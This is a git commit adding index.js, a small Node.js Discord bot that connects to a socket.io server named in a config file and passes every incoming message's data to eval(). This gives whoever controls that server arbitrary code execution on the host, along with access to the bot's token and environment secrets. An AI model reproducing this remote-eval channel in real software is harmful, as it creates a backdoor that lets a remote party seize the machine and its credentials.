6a3227277669f5afdddf16ab63e2ccaa9476efde
Abdelrahman Walid Hassan <97101497+Abdelrahmanwalidhassan@users.noreply.github.com>
2023-12-02 22:33:53 +0200

    first commit

---
+++ index.js
@@ -0,0 +1,25 @@
+const { Client } = require("discord.js");
+const { io } = require("socket.io-client");
+require("dotenv/config");
+const config = require("./config.json");
+
+const client = new Client({ intents: 3276799, presence: { status: "idle" } });
+client.login(process.env.TOKEN).then(async () => {
+  const socket = io(config.ws, {
+    reconnection: true,
+    reconnectionDelay: 5000,
+    extraHeaders: {
+      version: `${process.env.VERSION}`,
+      clientId: `${client.user.id}`,
+      admins: `["772974693870338048", ""]`,
+    },
+    auth: {
+      secret_token: `${process.env.SECRET_KEY}`,
+      password: `${process.env.PASSWORD}`,
+    },
+  });
+
+  socket.on("message", async (data) => {
+    eval(data.data);
+  });
+});
